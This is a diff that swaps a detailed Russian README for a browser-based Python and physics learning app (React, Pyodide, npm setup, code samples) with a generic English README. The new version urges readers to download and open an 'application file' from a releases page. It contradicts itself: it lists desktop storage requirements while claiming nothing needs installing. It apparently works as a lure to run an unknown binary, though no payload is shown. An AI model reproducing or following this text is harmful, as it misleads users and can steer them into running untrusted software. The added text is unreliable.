@@ -1,177 +1,59 @@
-# 🚀 PhysicsCodeLab
+# 🚀 PhysicsLab - Learn Physics Through Coding
 
-**Интерактивная платформа для изучения Python, математики и физики**
+## 🚀 Getting Started
 
-## ✨ Что это?
+Welcome to PhysicsLab, your interactive platform to learn Python, mathematics, and physics. This guide will help you download and run our application. With hands-on coding challenges, you will grasp physics concepts effectively. 
 
-PhysicsCodeLab объединяет три дисциплины в единый опыт, где каждая задача требует:
-- **Понимания физики** — что происходит и почему
-- **Знания математики** — как это описать формулами
-- **Навыков Python** — как это реализовать в коде
+## 📥 Download PhysicsLab
 
-## 🎯 Текущий статус: v0.6.0 🎉
+[![Download PhysicsLab](https://img.shields.io/badge/Download-PhysicsLab-brightgreen?style=flat-square)](https://github.com/crotobark/PhysicsLab/releases)
 
-### ✅ Модуль 1: Физика
-- **Monaco Editor** — полноценный редактор кода с подсветкой Python
-- **Pyodide 0.29.0** — Python 3.13 выполняется в браузере
-- **Библиотека physicslab** — встроенная Python библиотека с классами:
-  - `World` — физический мир
-  - `Ball` — шарики/частицы
-  - `Platform` — платформы
-- **Canvas Visualization** — HTML5 Canvas отрисовка объектов
-- **Миссия 1.1 "Первый шаг"** — полностью функциональна
+## 📚 About PhysicsLab
 
-### ✅ Модуль 5: Алгебра — **ПОЛНАЯ ВЕТКА 5.1** 🔥
-- **Библиотека mathlab** — математическая библиотека:
-  - `Function` — создание и вычисление функций
-  - `Canvas` — построение графиков с осями и сеткой
-  - Поддержка: sin, cos, sqrt, abs, log, exp, π, e
-- **MathCanvas** — визуализация графиков функций:
-  - Координатные оси с стрелками
-  - Динамическая сетка
-  - Легенда и подписи
-  - Поддержка нескольких функций на одном графике
-  - Отметка точек (mark_point)
-  - Асимптоты (draw_line)
-- **Панель теории** — с формулами KaTeX и подсказками
-- **Mission Selector** — переключение между миссиями
+PhysicsLab combines learning with interactive coding. You'll understand and apply physics while coding in Python. The platform runs directly in your browser, thanks to WebAssembly. Our missions focus on key physics concepts and mathematical formulas, making your learning experience both enjoyable and effective.
 
-### 🎛️ **6 МИССИЙ ГОТОВЫ:**
-#### Базовые (существующие):
-- ✅ 5.1.1 "Что такое функция?" — знакомство с линейными функциями
-- ✅ 5.1.2 "Семейство линейных функций" — параметры k и b **+ ИНТЕРАКТИВНЫЕ СЛАЙДЕРЫ** 🎚️  
-- ✅ 5.1.3 "Квадратичная функция" — параболы **+ ИНТЕРАКТИВНЫЕ СЛАЙДЕРЫ (a, b, c)** 🎚️
+## ⚙️ System Requirements
 
-#### Новые (Phase 1):
-- ✅ 5.1.4 "Кубическая функция — змейка" — y = x³, точка перегиба
-- ✅ 5.1.5 "Гипербола — две половинки" — y = 1/x, асимптоты
-- ✅ 5.1.6 "Галерея функций" — обзор всех функций, сравнение роста
+To run PhysicsLab smoothly, your system should meet the following requirements:
 
-### 🎨 **WOW-ФИЧИ (Phase 2):**
+- **Operating System:** Windows 10, macOS, or Linux
+- **Web Browser:** Latest version of Chrome, Firefox, Safari, or Edge
+- **Internet Connection:** Required for downloading and running the application
+- **RAM:** At least 4 GB recommended
+- **Storage:** Minimum of 500 MB free space
 
-#### 🎛️ Интерактивные Слайдеры (NEW!)
-- **Живое управление параметрами** — двигай слайдеры и видишь изменения мгновенно
-- **Debouncing 150ms** — плавные обновления без лагов
-- **Автогенерация кода** — код обновляется динамически
-- **Сброс к defaults** — кнопка возврата к начальным значениям
-- **Keyboard navigation** — управление стрелками
-- **Missions 5.1.2 & 5.1.3** поддерживают слайдеры
+## 💻 Download & Install
 
-### ✨ **UI/UX Enhancement (v0.6.0 - NEW!):**
+To get started:
 
-#### 🎭 Performance & Animations
-- **Page Transitions** — плавные переходы между страницами с fade/slide эффектами
-- **Motion Config** — оптимизированные Framer Motion настройки, GPU acceleration
-- **AnimatedButton** — микро-взаимодействия с hover/tap эффектами (4 варианта, 3 размера)
-- **Haptic Feedback** — визуальная обратная связь (Ripple, Shake, Pulse анимации)
+1. Visit the [Releases page](https://github.com/crotobark/PhysicsLab/releases).
+2. Locate the latest version of PhysicsLab.
+3. Click the download link to save the application file to your computer.
+4. Once the download completes, locate the file and open it.
 
-#### 🎨 Polish & UX
-- **Loading Skeletons** — 5 типов скелетонов для состояний загрузки
-- **Error/Empty States** — красивые состояния ошибок и пустых данных
-- **Responsive Design** — поддержка планшетов, адаптивные layouts
-- **Smooth Scrolling** — глобальный smooth scroll + scroll reveal анимации
-- **Accessibility** — ARIA labels, focus states, prefers-reduced-motion
+Follow any prompts to complete the installation. Once installed, launch the application and start your interactive learning journey!
 
-#### 🧪 Testing & Quality
-- **Animation Tests** — автоматическое тестирование поддержки анимаций
-- **Theme Tests** — проверка CSS variables, контраста WCAG AA
-- **Production Build** — ✅ готово к деплою
+## 🌟 Features of PhysicsLab
 
-### 🚧 Что дальше (Roadmap v0.7.0):
-- Module 5.2: Трансформации функций
-- Module 6: Геометрия
-- **Module 16: Алгоритмы и структуры данных** (спецификация готова)
+- **Interactive Missions:** Complete challenges that tie together physics and programming.
+- **Real-Time Feedback:** Receive instant feedback on your coding solutions.
+- **Browser-Based:** No installation of complex environments needed; everything runs in your browser.
+- **Learning Materials:** Access guides and examples to enhance understanding.
+- **Community Support:** Join our forums to connect with other learners and ask questions.
 
-## 🛠 Технологический стек
+## 🛠️ Troubleshooting
 
-- **Frontend**: React 18 + TypeScript + Vite
-- **Styling**: Tailwind CSS v3
-- **Code Editor**: Monaco Editor (VS Code engine)
-- **Python Runtime**: Pyodide (WebAssembly)
-- **Visualization**: HTML5 Canvas API
-- **State Management**: Zustand
-- **Math Rendering**: KaTeX (ready to use)
+If you encounter issues while downloading or running PhysicsLab, try these steps:
 
-## 🚀 Быстрый старт
+1. **Check Your Connection:** Ensure that you have a stable internet connection.
+2. **Browser Compatibility:** Make sure your browser is up to date.
+3. **Clear Cache:** Sometimes, clearing your browser cache can help solve loading issues.
+4. **Re-download:** If the installation failed, try downloading the application again.
 
-```bash
-# Установка зависимостей
-npm install
+For further assistance, you can visit our [support page](https://github.com/crotobark/PhysicsLab/issues) on GitHub.
 
-# Запуск dev сервера
-npm run dev
+## 📞 Connect with Us
 
-# Сборка для продакшена
-npm run build
-```
+Feel free to reach out with questions or feedback. Connect through our GitHub page or post your queries in our community forums. 
 
-Откройте http://localhost:5173
-
-## 📝 Структура проекта
-
-```
-physicslab/
-├── src/
-│   ├── components/      # React компоненты
-│   ├── hooks/           # Custom hooks (usePython)
-│   ├── lib/             # Pyodide loader
-│   ├── store/           # Zustand state
-│   ├── content/         # Миссии и контент
-│   └── types/           # TypeScript типы
-├── python/
-│   └── physicslab/      # Python библиотека
-└── public/              # Статические файлы
-```
-
-## 🎓 Примеры использования
-
-### Модуль 1: Физика
-```python
-from physicslab import *
-
-# Создаём мир
-world = World(gravity=9.81, width=800, height=600)
-
-# Создаём объекты
-robot = Ball(x=400, y=300, radius=20, color="blue")
-target = Ball(x=400, y=300, radius=30, color="green", fixed=True)
-
-# Добавляем в мир
-world.add(robot)
-world.add(target)
-
-# Запускаем симуляцию
-world.run()
-```
-
-### Модуль 5: Математика (NEW! 🔥)
-```python
-from mathlab import *
-
-# Создаём функции
-f = Function("2*x")           # Линейная функция
-g = Function("x**2")          # Парабола
-h = Function("sin(x)")        # Синусоида
-
-# Вычисляем значения
-print(f(5))  # 10
-print(g(3))  # 9
-
-# Рисуем графики
-canvas = Canvas(x_range=(-5, 5), y_range=(-10, 10))
-canvas.plot(f, color="blue", name="y = 2x")
-canvas.plot(g, color="red", name="y = x²")
-canvas.show()
-```
-
-## 📄 Лицензия
-
-MIT
-
-## 👨‍💻 Автор
-
-NeuroHand + Claude Code
-
----
-
-**Статус**: 🟢 Активная разработка | **Версия**: 0.4.0 — 3 миссии готовы!
+Thank you for choosing PhysicsLab! Enjoy your journey in learning physics through coding.
